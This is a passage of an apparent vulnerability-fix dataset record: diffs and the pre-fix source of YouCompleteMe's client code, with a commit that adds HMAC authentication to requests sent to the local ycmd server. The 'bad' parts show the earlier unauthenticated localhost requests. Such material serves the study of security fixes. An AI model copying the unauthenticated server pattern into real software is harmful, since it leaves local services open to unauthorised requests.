Vim.\n signal.signal( signal.SIGINT, signal.SIG_IGN )\n \n+HMAC_SECRET_LENGTH = 16\n NUM_YCMD_STDERR_LINES_ON_CRASH = 30\n SERVER_CRASH_MESSAGE_STDERR_FILE = (\n   'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n@@ -80,16 +82,18 @@ def __init__( self, user_options ):\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n@@ -116,6 +120,7 @@ def _SetupServer( self ):\n \n       self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)\n       BaseRequest.server_location = 'http:\/\/localhost:' + str( server_port )\n+      BaseRequest.hmac_secret = hmac_secret\n \n     self._NotifyUserIfServerCrashed()\n \n@@ -148,7 +153,6 @@ def ServerPid( self ):\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","files":{"\/python\/ycm\/client\/base_request.py":{"changes":[{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]},{"diff":"\n                            timeout = _DEFAULT_TIMEOUT_SEC ):\n     def SendRequest( data, handler, method, timeout ):\n       if method == 'POST':\n-        return BaseRequest.session.post( _BuildUri( handler ),\n-                                        data = ToUtf8Json( data ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        sent_data = ToUtf8Json( data )\n+        return BaseRequest.session.post(\n+            _BuildUri( handler ),\n+            data = sent_data,\n+            headers = BaseRequest._ExtraHeaders( sent_data ),\n+            timeout = timeout )\n       if method == 'GET':\n-        return BaseRequest.session.get( _BuildUri( handler ),\n-                                        headers = _HEADERS,\n-                                        timeout = timeout )\n+        return BaseRequest.session.get(\n+            _BuildUri( handler ),\n+            headers = BaseRequest._ExtraHeaders(),\n+            timeout = timeout )\n \n     @retries( 5, delay = 0.5, backoff = 1.5 )\n     def DelayedSendRequest( data, handler, method ):\n       if method == 'POST':\n+        sent_data = ToUtf8Json( data )\n         return requests.post( _BuildUri( handler ),\n-                              data = ToUtf8Json( data ),\n-                              headers = _HEADERS )\n+                              data = sent_data,\n+                              headers = BaseRequest._ExtraHeaders( sent_data ) )\n       if method == 'GET':\n         return requests.get( _BuildUri( handler ),\n-                             headers = _HEADERS )\n+                             headers = BaseRequest._ExtraHeaders() )\n \n     if not _CheckServerIsHealthyWithCache():\n       return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n","add":14,"remove":10,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["        return BaseRequest.session.post( _BuildUri( handler ),","                                        data = ToUtf8Json( data ),","                                        headers = _HEADERS,","                                        timeout = timeout )","        return BaseRequest.session.get( _BuildUri( handler ),","                                        headers = _HEADERS,","                                        timeout = timeout )","                              data = ToUtf8Json( data ),","                              headers = _HEADERS )","                             headers = _HEADERS )"],"goodparts":["        sent_data = ToUtf8Json( data )","        return BaseRequest.session.post(","            _BuildUri( handler ),","            data = sent_data,","            headers = BaseRequest._ExtraHeaders( sent_data ),","            timeout = timeout )","        return BaseRequest.session.get(","            _BuildUri( handler ),","            headers = BaseRequest._ExtraHeaders(),","            timeout = timeout )","        sent_data = ToUtf8Json( data )","                              data = sent_data,","                              headers = BaseRequest._ExtraHeaders( sent_data ) )","                             headers = BaseRequest._ExtraHeaders() )"]},{"diff":"\n   global SERVER_HEALTHY\n \n   def _ServerIsHealthy():\n-    response = requests.get( _BuildUri( 'healthy' ) )\n+    response = requests.get( _BuildUri( 'healthy' ),\n+                             headers = BaseRequest._ExtraHeaders() )\n+    _ValidateResponseObject( response )\n     response.raise_for_status()\n     return response.json()\n ","add":3,"remove":1,"filename":"\/python\/ycm\/client\/base_request.py","badparts":["    response = requests.get( _BuildUri( 'healthy' ) )"],"goodparts":["    response = requests.get( _BuildUri( 'healthy' ),","                             headers = BaseRequest._ExtraHeaders() )","    _ValidateResponseObject( response )"]}],"source":"\n import vim import requests import urlparse from retries import retries from requests_futures.sessions import FuturesSession from ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor from ycm import vimsupport from ycm.utils import ToUtf8Json from ycm.server.responses import ServerError, UnknownExtraConf _HEADERS={'content-type': 'application\/json'} _EXECUTOR=UnsafeThreadPoolExecutor( max_workers=30) _DEFAULT_TIMEOUT_SEC=30 class BaseRequest( object): def __init__( self): pass def Start( self): pass def Done( self): return True def Response( self): return{} @staticmethod def GetDataFromHandler( handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '', handler, 'GET', timeout)) @staticmethod def PostDataToHandler( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data, handler, timeout)) @staticmethod def PostDataToHandlerAsync( data, handler, timeout=_DEFAULT_TIMEOUT_SEC): return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout) @staticmethod def _TalkToHandlerAsync( data, handler, method, timeout=_DEFAULT_TIMEOUT_SEC): def SendRequest( data, handler, method, timeout): if method=='POST': return BaseRequest.session.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS, timeout=timeout) if method=='GET': return BaseRequest.session.get( _BuildUri( handler), headers=_HEADERS, timeout=timeout) @retries( 5, delay=0.5, backoff=1.5) def DelayedSendRequest( data, handler, method): if method=='POST': return requests.post( _BuildUri( handler), data=ToUtf8Json( data), headers=_HEADERS) if method=='GET': return requests.get( _BuildUri( handler), headers=_HEADERS) if not _CheckServerIsHealthyWithCache(): return _EXECUTOR.submit( DelayedSendRequest, data, handler, method) return SendRequest( data, handler, method, timeout) session=FuturesSession( executor=_EXECUTOR) server_location='http:\/\/localhost:6666' def BuildRequestData( start_column=None, query=None, include_buffer_data=True): line, column=vimsupport.CurrentLineAndColumn() filepath=vimsupport.GetCurrentBufferFilepath() request_data={ 'filetypes': vimsupport.CurrentFiletypes(), 'line_num': line, 'column_num': column, 'start_column': start_column, 'line_value': vim.current.line, 'filepath': filepath } if include_buffer_data: request_data[ 'file_data']=vimsupport.GetUnsavedAndCurrentBufferData() if query: request_data[ 'query']=query return request_data def JsonFromFuture( future): response=future.result() if response.status_code==requests.codes.server_error: _RaiseExceptionForData( response.json()) response.raise_for_status() if response.text: return response.json() return None def _BuildUri( handler): return urlparse.urljoin( BaseRequest.server_location, handler) SERVER_HEALTHY=False def _CheckServerIsHealthyWithCache(): global SERVER_HEALTHY def _ServerIsHealthy(): response=requests.get( _BuildUri( 'healthy')) response.raise_for_status() return response.json() if SERVER_HEALTHY: return True try: SERVER_HEALTHY=_ServerIsHealthy() return SERVER_HEALTHY except: return False def _RaiseExceptionForData( data): if data[ 'exception'][ 'TYPE']==UnknownExtraConf.__name__: raise UnknownExtraConf( data[ 'exception'][ 'extra_conf_file']) raise ServerError( '{0}:{1}'.format( data[ 'exception'][ 'TYPE'], data[ 'message'])) ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2013  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport vim\nimport requests\nimport urlparse\nfrom retries import retries\nfrom requests_futures.sessions import FuturesSession\nfrom ycm.unsafe_thread_pool_executor import UnsafeThreadPoolExecutor\nfrom ycm import vimsupport\nfrom ycm.utils import ToUtf8Json\nfrom ycm.server.responses import ServerError, UnknownExtraConf\n\n_HEADERS = {'content-type': 'application\/json'}\n_EXECUTOR = UnsafeThreadPoolExecutor( max_workers = 30 )\n# Setting this to None seems to screw up the Requests\/urllib3 libs.\n_DEFAULT_TIMEOUT_SEC = 30\n\nclass BaseRequest( object ):\n  def __init__( self ):\n    pass\n\n\n  def Start( self ):\n    pass\n\n\n  def Done( self ):\n    return True\n\n\n  def Response( self ):\n    return {}\n\n  # This method blocks\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def GetDataFromHandler( handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest._TalkToHandlerAsync( '',\n                                                            handler,\n                                                            'GET',\n                                                            timeout ) )\n\n\n  # This is the blocking version of the method. See below for async.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandler( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return JsonFromFuture( BaseRequest.PostDataToHandlerAsync( data,\n                                                               handler,\n                                                               timeout ) )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def PostDataToHandlerAsync( data, handler, timeout = _DEFAULT_TIMEOUT_SEC ):\n    return BaseRequest._TalkToHandlerAsync( data, handler, 'POST', timeout )\n\n\n  # This returns a future! Use JsonFromFuture to get the value.\n  # |method| is either 'POST' or 'GET'.\n  # |timeout| is num seconds to tolerate no response from server before giving\n  # up; see Requests docs for details (we just pass the param along).\n  @staticmethod\n  def _TalkToHandlerAsync( data,\n                           handler,\n                           method,\n                           timeout = _DEFAULT_TIMEOUT_SEC ):\n    def SendRequest( data, handler, method, timeout ):\n      if method == 'POST':\n        return BaseRequest.session.post( _BuildUri( handler ),\n                                        data = ToUtf8Json( data ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n      if method == 'GET':\n        return BaseRequest.session.get( _BuildUri( handler ),\n                                        headers = _HEADERS,\n                                        timeout = timeout )\n\n    @retries( 5, delay = 0.5, backoff = 1.5 )\n    def DelayedSendRequest( data, handler, method ):\n      if method == 'POST':\n        return requests.post( _BuildUri( handler ),\n                              data = ToUtf8Json( data ),\n                              headers = _HEADERS )\n      if method == 'GET':\n        return requests.get( _BuildUri( handler ),\n                             headers = _HEADERS )\n\n    if not _CheckServerIsHealthyWithCache():\n      return _EXECUTOR.submit( DelayedSendRequest, data, handler, method )\n\n    return SendRequest( data, handler, method, timeout )\n\n\n  session = FuturesSession( executor = _EXECUTOR )\n  server_location = 'http:\/\/localhost:6666'\n\n\ndef BuildRequestData( start_column = None,\n                      query = None,\n                      include_buffer_data = True ):\n  line, column = vimsupport.CurrentLineAndColumn()\n  filepath = vimsupport.GetCurrentBufferFilepath()\n  request_data = {\n    'filetypes': vimsupport.CurrentFiletypes(),\n    'line_num': line,\n    'column_num': column,\n    'start_column': start_column,\n    'line_value': vim.current.line,\n    'filepath': filepath\n  }\n\n  if include_buffer_data:\n    request_data[ 'file_data' ] = vimsupport.GetUnsavedAndCurrentBufferData()\n  if query:\n    request_data[ 'query' ] = query\n\n  return request_data\n\n\ndef JsonFromFuture( future ):\n  response = future.result()\n  if response.status_code == requests.codes.server_error:\n    _RaiseExceptionForData( response.json() )\n\n  # We let Requests handle the other status types, we only handle the 500\n  # error code.\n  response.raise_for_status()\n\n  if response.text:\n    return response.json()\n  return None\n\n\ndef _BuildUri( handler ):\n  return urlparse.urljoin( BaseRequest.server_location, handler )\n\n\nSERVER_HEALTHY = False\n\ndef _CheckServerIsHealthyWithCache():\n  global SERVER_HEALTHY\n\n  def _ServerIsHealthy():\n    response = requests.get( _BuildUri( 'healthy' ) )\n    response.raise_for_status()\n    return response.json()\n\n  if SERVER_HEALTHY:\n    return True\n\n  try:\n    SERVER_HEALTHY = _ServerIsHealthy()\n    return SERVER_HEALTHY\n  except:\n    return False\n\n\ndef _RaiseExceptionForData( data ):\n  if data[ 'exception' ][ 'TYPE' ] == UnknownExtraConf.__name__:\n    raise UnknownExtraConf( data[ 'exception' ][ 'extra_conf_file' ] )\n\n  raise ServerError( '{0}: {1}'.format( data[ 'exception' ][ 'TYPE' ],\n                                        data[ 'message' ] ) )\n"},"\/python\/ycm\/youcompleteme.py":{"changes":[{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]},{"diff":"\n     self._server_stderr = None\n     self._server_popen = None\n     self._filetypes_with_keywords_loaded = set()\n-    self._temp_options_filename = None\n     self._ycmd_keepalive = YcmdKeepalive()\n     self._SetupServer()\n     self._ycmd_keepalive.Start()\n \n   def _SetupServer( self ):\n     server_port = utils.GetUnusedLocalhostPort()\n+    # The temp options file is deleted by ycmd during startup\n     with tempfile.NamedTemporaryFile( delete = False ) as options_file:\n-      self._temp_options_filename = options_file.name\n-      json.dump( dict( self._user_options ), options_file )\n+      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )\n+      options_dict = dict( self._user_options )\n+      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )\n+      json.dump( options_dict, options_file )\n       options_file.flush()\n \n       args = [ utils.PathToPythonInterpreter(),\n","add":5,"remove":3,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    self._temp_options_filename = None","      self._temp_options_filename = options_file.name","      json.dump( dict( self._user_options ), options_file )"],"goodparts":["      hmac_secret = os.urandom( HMAC_SECRET_LENGTH )","      options_dict = dict( self._user_options )","      options_dict[ 'hmac_secret' ] = base64.b64encode( hmac_secret )","      json.dump( options_dict, options_file )"]},{"diff":"\n   def _ServerCleanup( self ):\n     if self._IsServerAlive():\n       self._server_popen.terminate()\n-    utils.RemoveIfExists( self._temp_options_filename )\n \n \n   def RestartServer( self ):\n","add":0,"remove":1,"filename":"\/python\/ycm\/youcompleteme.py","badparts":["    utils.RemoveIfExists( self._temp_options_filename )"],"goodparts":[]}],"source":"\n import os import vim import tempfile import json import signal from subprocess import PIPE from ycm import vimsupport from ycm import utils from ycm.diagnostic_interface import DiagnosticInterface from ycm.completers.all.omni_completer import OmniCompleter from ycm.completers.general import syntax_parse from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype from ycm.client.ycmd_keepalive import YcmdKeepalive from ycm.client.base_request import BaseRequest, BuildRequestData from ycm.client.command_request import SendCommandRequest from ycm.client.completion_request import CompletionRequest from ycm.client.omni_completion_request import OmniCompletionRequest from ycm.client.event_notification import( SendEventNotificationAsync, EventNotification) from ycm.server.responses import ServerError try: from UltiSnips import UltiSnips_Manager USE_ULTISNIPS_DATA=True except ImportError: USE_ULTISNIPS_DATA=False os.environ['no_proxy']='127.0.0.1,localhost' signal.signal( signal.SIGINT, signal.SIG_IGN) NUM_YCMD_STDERR_LINES_ON_CRASH=30 SERVER_CRASH_MESSAGE_STDERR_FILE=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' + 'Stderr(last{0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH)) SERVER_CRASH_MESSAGE_SAME_STDERR=( 'The ycmd server SHUT DOWN(restart with:YcmRestartServer). ' ' check console output for logs!') SERVER_IDLE_SUICIDE_SECONDS=10800 class YouCompleteMe( object): def __init__( self, user_options): self._user_options=user_options self._user_notified_about_crash=False self._diag_interface=DiagnosticInterface( user_options) self._omnicomp=OmniCompleter( user_options) self._latest_completion_request=None self._latest_file_parse_request=None self._server_stdout=None self._server_stderr=None self._server_popen=None self._filetypes_with_keywords_loaded=set() self._temp_options_filename=None self._ycmd_keepalive=YcmdKeepalive() self._SetupServer() self._ycmd_keepalive.Start() def _SetupServer( self): server_port=utils.GetUnusedLocalhostPort() with tempfile.NamedTemporaryFile( delete=False) as options_file: self._temp_options_filename=options_file.name json.dump( dict( self._user_options), options_file) options_file.flush() args=[ utils.PathToPythonInterpreter(), _PathToServerScript(), '--port={0}'.format( server_port), '--options_file={0}'.format( options_file.name), '--log={0}'.format( self._user_options[ 'server_log_level']), '--idle_suicide_seconds={0}'.format( SERVER_IDLE_SUICIDE_SECONDS)] if not self._user_options[ 'server_use_vim_stdout']: filename_format=os.path.join( utils.PathToTempDir(), 'server_{port}_{std}.log') self._server_stdout=filename_format.format( port=server_port, std='stdout') self._server_stderr=filename_format.format( port=server_port, std='stderr') args.append('--stdout={0}'.format( self._server_stdout)) args.append('--stderr={0}'.format( self._server_stderr)) if self._user_options[ 'server_keep_logfiles']: args.append('--keep_logfiles') self._server_popen=utils.SafePopen( args, stdout=PIPE, stderr=PIPE) BaseRequest.server_location='http:\/\/localhost:' +str( server_port) self._NotifyUserIfServerCrashed() def _IsServerAlive( self): returncode=self._server_popen.poll() return returncode is None def _NotifyUserIfServerCrashed( self): if self._user_notified_about_crash or self._IsServerAlive(): return self._user_notified_about_crash=True if self._server_stderr: with open( self._server_stderr, 'r') as server_stderr_file: error_output=''.join( server_stderr_file.readlines()[ : -NUM_YCMD_STDERR_LINES_ON_CRASH]) vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE + error_output) else: vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR) def ServerPid( self): if not self._server_popen: return -1 return self._server_popen.pid def _ServerCleanup( self): if self._IsServerAlive(): self._server_popen.terminate() utils.RemoveIfExists( self._temp_options_filename) def RestartServer( self): vimsupport.PostVimMessage( 'Restarting ycmd server...') self._user_notified_about_crash=False self._ServerCleanup() self._SetupServer() def CreateCompletionRequest( self, force_semantic=False): if( not self.NativeFiletypeCompletionAvailable() and self.CurrentFiletypeCompletionEnabled() and self._omnicomp.ShouldUseNow()): self._latest_completion_request=OmniCompletionRequest( self._omnicomp) else: extra_data={} self._AddExtraConfDataIfNeeded( extra_data) if force_semantic: extra_data[ 'force_semantic']=True self._latest_completion_request=( CompletionRequest( extra_data) if self._IsServerAlive() else None) return self._latest_completion_request def SendCommandRequest( self, arguments, completer): if self._IsServerAlive(): return SendCommandRequest( arguments, completer) def GetDefinedSubcommands( self): if self._IsServerAlive(): return BaseRequest.PostDataToHandler( BuildRequestData(), 'defined_subcommands') else: return[] def GetCurrentCompletionRequest( self): return self._latest_completion_request def GetOmniCompleter( self): return self._omnicomp def NativeFiletypeCompletionAvailable( self): return any([ FiletypeCompleterExistsForFiletype( x) for x in vimsupport.CurrentFiletypes()]) def NativeFiletypeCompletionUsable( self): return( self.CurrentFiletypeCompletionEnabled() and self.NativeFiletypeCompletionAvailable()) def OnFileReadyToParse( self): self._omnicomp.OnFileReadyToParse( None) if not self._IsServerAlive(): self._NotifyUserIfServerCrashed() extra_data={} self._AddTagsFilesIfNeeded( extra_data) self._AddSyntaxDataIfNeeded( extra_data) self._AddExtraConfDataIfNeeded( extra_data) self._latest_file_parse_request=EventNotification( 'FileReadyToParse', extra_data) self._latest_file_parse_request.Start() def OnBufferUnload( self, deleted_buffer_file): if not self._IsServerAlive(): return SendEventNotificationAsync( 'BufferUnload', { 'unloaded_buffer': deleted_buffer_file}) def OnBufferVisit( self): if not self._IsServerAlive(): return extra_data={} _AddUltiSnipsDataIfNeeded( extra_data) SendEventNotificationAsync( 'BufferVisit', extra_data) def OnInsertLeave( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'InsertLeave') def OnCursorMoved( self): self._diag_interface.OnCursorMoved() def OnVimLeave( self): self._ServerCleanup() def OnCurrentIdentifierFinished( self): if not self._IsServerAlive(): return SendEventNotificationAsync( 'CurrentIdentifierFinished') def DiagnosticsForCurrentFileReady( self): return bool( self._latest_file_parse_request and self._latest_file_parse_request.Done()) def GetDiagnosticsFromStoredRequest( self, qflist_format=False): if self.DiagnosticsForCurrentFileReady(): diagnostics=self._latest_file_parse_request.Response() self._latest_file_parse_request=None if qflist_format: return vimsupport.ConvertDiagnosticsToQfList( diagnostics) else: return diagnostics return[] def UpdateDiagnosticInterface( self): if not self.DiagnosticsForCurrentFileReady(): return self._diag_interface.UpdateWithNewDiagnostics( self.GetDiagnosticsFromStoredRequest()) def ShowDetailedDiagnostic( self): if not self._IsServerAlive(): return try: debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'detailed_diagnostic') if 'message' in debug_info: vimsupport.EchoText( debug_info[ 'message']) except ServerError as e: vimsupport.PostVimMessage( str( e)) def DebugInfo( self): if self._IsServerAlive(): debug_info=BaseRequest.PostDataToHandler( BuildRequestData(), 'debug_info') else: debug_info='Server crashed, no debug info from server' debug_info +='\\nServer running at:{0}'.format( BaseRequest.server_location) debug_info +='\\nServer process ID:{0}'.format( self._server_popen.pid) if self._server_stderr or self._server_stdout: debug_info +='\\nServer logfiles:\\n {0}\\n {1}'.format( self._server_stdout, self._server_stderr) return debug_info def CurrentFiletypeCompletionEnabled( self): filetypes=vimsupport.CurrentFiletypes() filetype_to_disable=self._user_options[ 'filetype_specific_completion_to_disable'] return not all([ x in filetype_to_disable for x in filetypes]) def _AddSyntaxDataIfNeeded( self, extra_data): if not self._user_options[ 'seed_identifiers_with_syntax']: return filetype=vimsupport.CurrentFiletypes()[ 0] if filetype in self._filetypes_with_keywords_loaded: return self._filetypes_with_keywords_loaded.add( filetype) extra_data[ 'syntax_keywords']=list( syntax_parse.SyntaxKeywordsForCurrentBuffer()) def _AddTagsFilesIfNeeded( self, extra_data): def GetTagFiles(): tag_files=vim.eval( 'tagfiles()') current_working_directory=os.getcwd() return[ os.path.join( current_working_directory, x) for x in tag_files] if not self._user_options[ 'collect_identifiers_from_tags_files']: return extra_data[ 'tag_files']=GetTagFiles() def _AddExtraConfDataIfNeeded( self, extra_data): def BuildExtraConfData( extra_conf_vim_data): return dict(( expr, vimsupport.VimExpressionToPythonType( expr)) for expr in extra_conf_vim_data) extra_conf_vim_data=self._user_options[ 'extra_conf_vim_data'] if extra_conf_vim_data: extra_data[ 'extra_conf_data']=BuildExtraConfData( extra_conf_vim_data) def _PathToServerScript(): dir_of_current_script=os.path.dirname( os.path.abspath( __file__)) return os.path.join( dir_of_current_script, 'server\/ycmd.py') def _AddUltiSnipsDataIfNeeded( extra_data): if not USE_ULTISNIPS_DATA: return try: rawsnips=UltiSnips_Manager._snips( '', 1) except: return extra_data[ 'ultisnips_snippets']=[{ 'trigger': x.trigger, 'description': x.description } for x in rawsnips] ","sourceWithComments":"#!\/usr\/bin\/env python\n#\n# Copyright (C) 2011, 2012  Google Inc.\n#\n# This file is part of YouCompleteMe.\n#\n# YouCompleteMe is free software: you can redistribute it and\/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# YouCompleteMe is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with YouCompleteMe.  If not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nimport os\nimport vim\nimport tempfile\nimport json\nimport signal\nfrom subprocess import PIPE\nfrom ycm import vimsupport\nfrom ycm import utils\nfrom ycm.diagnostic_interface import DiagnosticInterface\nfrom ycm.completers.all.omni_completer import OmniCompleter\nfrom ycm.completers.general import syntax_parse\nfrom ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype\nfrom ycm.client.ycmd_keepalive import YcmdKeepalive\nfrom ycm.client.base_request import BaseRequest, BuildRequestData\nfrom ycm.client.command_request import SendCommandRequest\nfrom ycm.client.completion_request import CompletionRequest\nfrom ycm.client.omni_completion_request import OmniCompletionRequest\nfrom ycm.client.event_notification import ( SendEventNotificationAsync,\n                                            EventNotification )\nfrom ycm.server.responses import ServerError\n\ntry:\n  from UltiSnips import UltiSnips_Manager\n  USE_ULTISNIPS_DATA = True\nexcept ImportError:\n  USE_ULTISNIPS_DATA = False\n\n# We need this so that Requests doesn't end up using the local HTTP proxy when\n# talking to ycmd. Users should actually be setting this themselves when\n# configuring a proxy server on their machine, but most don't know they need to\n# or how to do it, so we do it for them.\n# Relevant issues:\n#  https:\/\/github.com\/Valloric\/YouCompleteMe\/issues\/641\n#  https:\/\/github.com\/kennethreitz\/requests\/issues\/879\nos.environ['no_proxy'] = '127.0.0.1,localhost'\n\n# Force the Python interpreter embedded in Vim (in which we are running) to\n# ignore the SIGINT signal. This helps reduce the fallout of a user pressing\n# Ctrl-C in Vim.\nsignal.signal( signal.SIGINT, signal.SIG_IGN )\n\nNUM_YCMD_STDERR_LINES_ON_CRASH = 30\nSERVER_CRASH_MESSAGE_STDERR_FILE = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +\n  'Stderr (last {0} lines):\\n\\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )\nSERVER_CRASH_MESSAGE_SAME_STDERR = (\n  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '\n  ' check console output for logs!' )\nSERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 